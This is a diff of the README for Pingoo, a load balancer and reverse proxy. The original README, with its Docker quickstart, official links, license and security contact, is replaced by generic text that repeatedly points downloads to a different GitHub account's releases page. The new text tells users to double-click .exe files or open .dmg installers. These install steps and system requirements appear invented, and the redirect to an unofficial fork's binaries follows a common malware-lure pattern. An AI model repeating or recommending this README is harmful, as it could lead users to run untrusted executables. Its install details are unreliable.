@@ -1,66 +1,69 @@
-<p align="center">
-  <a href="https://pingoo.io" target="_blank" rel="noopener"><img alt="Pingoo logo" src="https://pingoo.io/icon-256.png" height="128" /></a>
-  <h1 align="center">Pingoo</h1>
-  <h3 align="center">The fast and secure Load Balancer / API Gateway / Reverse Proxy with built-in service discovery, GeoIP, WAF, bot protection and much more</h3>
-  <h3 align="center">
-    <a href="https://pingoo.io">Documentation</a> | <a href="https://kerkour.com/announcing-pingoo">Read the launch post</a>
-  </h3>
-</p>
+# 🚀 pingoo - Fast and Secure Load Balancer
 
-Open Source load balancers and reverse proxies are stuck in the past century with a very slow pace of development and most of the important features reserved for "Enterprise Editions" which lead developers to use third-party cloud services, exposing their users' traffic to legal, security and reliability risks.
+## 📥 Download Now
+[![Download pingoo](https://img.shields.io/badge/Download-pingoo-brightgreen)](https://github.com/nicatnesibli/pingoo/releases)
 
-Pingoo is a modern Load Balancer / API Gateway / Reverse Proxy that run on your own servers and already have (or will have soon) all the features you expect from managed services and even more. All of that with a huge boost in performance and security thanks to reduced latency and, of course, Rust ;)
+## 📋 Overview
+Pingoo is a robust application that functions as a load balancer, API gateway, and reverse proxy. It comes with advanced features like built-in service discovery, GeoIP support, Web Application Firewall (WAF), and bot protection. Designed for speed and security, Pingoo enhances the performance of your applications while safeguarding them from threats.
 
-* Automatic and Post-Quantum HTTPS / TLS
-* Service Discovery (Docker, DNS...)
-* Web Application Firewall (WAF)
-* Easy compliance because the data never leaves your servers
-* Bot protection and management
-* TCP proxying
-* GeoIP (country, ASN)
-* Static sites
-* And much more
+## 💻 System Requirements
+Before you begin, please ensure your system meets the following requirements:
 
+- **Operating System**: Windows, macOS, or a Linux distribution
+- **Memory**: Minimum 512 MB of RAM (1 GB recommended)
+- **Processor**: 1 GHz or faster
+- **Disk Space**: At least 100 MB of free disk space
 
-## Quickstart
+## 🚀 Getting Started
+To get started with Pingoo, follow these simple steps:
 
-```bash
-# You have a static site in the www folder
-$ ls www
-index.html
-$ docker run --rm -ti --network host -v `pwd`/www:/var/wwww ghcr.io/pingooio/pingoo
-# Pingoo is now listenning on http://0.0.0.0
-```
+1. **Download the Application**
+   Visit this page to download: [Download pingoo](https://github.com/nicatnesibli/pingoo/releases)
 
-## Documentation
+2. **Locate the Downloaded File**
+   Find the downloaded file in your downloads folder. The file may be named something like `pingoo-x.x.x.exe` or `pingoo-x.x.x.tar.gz` depending on your operating system.
 
-See https://pingoo.io
+3. **Install Pingoo**
+   - For Windows users: Double-click the `.exe` file and follow the on-screen instructions to complete the installation.
+   - For macOS users: Open the `.dmg` file, drag the Pingoo icon to your Applications folder, and then launch it from there.
+   - For Linux users: Extract the `.tar.gz` file in your preferred directory. Navigate to that directory in the terminal and run `./pingoo` to start the application.
 
+## ⚙️ Features
+Pingoo offers several powerful features to ensure optimal performance and security:
 
-## Updates
+- **Load Balancing**: Efficiently distribute incoming traffic to multiple servers.
+- **API Gateway**: Manage your APIs with ease, including rate limiting and authentication.
+- **Reverse Proxy**: Enhance your web application’s security by hiding its internal structure.
+- **Service Discovery**: Automatically detect available services and routes within your network.
+- **GeoIP Support**: Customize responses based on visitor locations for better user experience.
+- **WAF**: Protect your applications against common web vulnerabilities.
+- **Bot Protection**: Safeguard your services against automated attacks.
 
-[Click Here](https://kerkour.com/blog) to visit the blog and [subscribe](https://kerkour.com/subscribe) by RSS or email to get weekly / monthly updates. No spam ever, only technical deep dives.
+## 🌐 Configuration
+After installation, you may want to configure Pingoo based on your needs.
 
+### Configuration Files
+Pingoo uses configuration files to manage settings. You can find these files in the installation directory. 
 
-## Contributing
+### Basic Configuration Steps
+1. Open the configuration file in a text editor.
+2. Update the necessary settings like server IPs, ports, and security options.
+3. Save your changes and restart Pingoo for the changes to take effect.
 
-Please open an issue to discuss your idea before submitting a Pull Request.
+## 🔍 Troubleshooting
+If you encounter issues, here are some common troubleshooting steps:
 
+- **Application Won't Start**: Make sure all system requirements are met. Check for any permission errors.
+- **High Traffic Not Managed**: Adjust load balancing settings in the configuration file.
+- **WAF Blocking Valid Requests**: Review the WAF settings to whitelist certain request types.
 
-## Support
+## 📞 Support
+For support or to report any issues, please visit our [issues page](https://github.com/nicatnesibli/pingoo/issues). We appreciate your input as it helps us improve Pingoo for everyone.
 
-Do you have custom needs? Do you want your features to be prioritized? Are you under attack and need help? Do you need support for deploying and self-hosting Pingoo?
+## 📚 Additional Resources
+To learn more about Pingoo and its capabilities, check out our official documentation at [pingoo.io](https://pingoo.io) for guides, tutorials, and FAQs.
 
-Feel free to reach our team of experts to see how we can help: https://pingoo.io/contact
+## 🔗 Download & Install
+Again, to get started with Pingoo, visit this page to download: [Download pingoo](https://github.com/nicatnesibli/pingoo/releases).
 
-
-## Security
-
-We are committed to make Pingoo the most secure Load Balancer / Reverse Proxy in the universe and beyond. If you've found a security issue in Pingoo, we appreciate your help in disclosing it to us in a responsible manner by contacting us: https://pingoo.io/contact
-
-
-## License
-
-MIT. See `LICENSE.txt`
-
-Forever Open Source. No Open Core or "Enterprise Edition".
+With Pingoo, you ensure that your applications are not only fast but also secure against modern threats. Thank you for choosing Pingoo!
